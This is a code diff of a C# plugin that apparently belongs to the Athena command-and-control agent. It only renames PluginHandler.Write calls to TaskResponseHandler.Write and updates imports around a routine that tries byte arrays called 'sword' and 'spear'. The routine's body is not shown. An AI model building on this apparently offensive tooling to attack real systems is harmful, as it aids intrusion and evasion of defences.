@@ -1,4 +1,6 @@
-﻿using Athena.Plugins;
+﻿using Athena.Commands;
+using Athena.Commands.Models;
+using Athena.Utilities;
 using System.Runtime.InteropServices;
 using System.Text;
 
@@ -31,7 +33,7 @@ namespace Plguins
                 {
                     if (SpearAndShield(sword))
                     {
-                        PluginHandler.Write("Success", (string)args["task-id"], true);
+                        TaskResponseHandler.Write("Success", (string)args["task-id"], true);
                         return;
                     }
                 }
@@ -39,18 +41,18 @@ namespace Plguins
                 {
                     if (SpearAndShield(spear))
                     {
-                        PluginHandler.Write("Success", (string)args["task-id"], true);
+                        TaskResponseHandler.Write("Success", (string)args["task-id"], true);
                         return;
                     }
                 }
 
-                PluginHandler.Write("Failed", (string)args["task-id"], true, "error");
+                TaskResponseHandler.Write("Failed", (string)args["task-id"], true, "error");
                 return;
             }
             catch (Exception e)
             {
                 //oh no an error
-                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
+                TaskResponseHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
             }
         }
         private static bool SpearAndShield(byte[] shield)
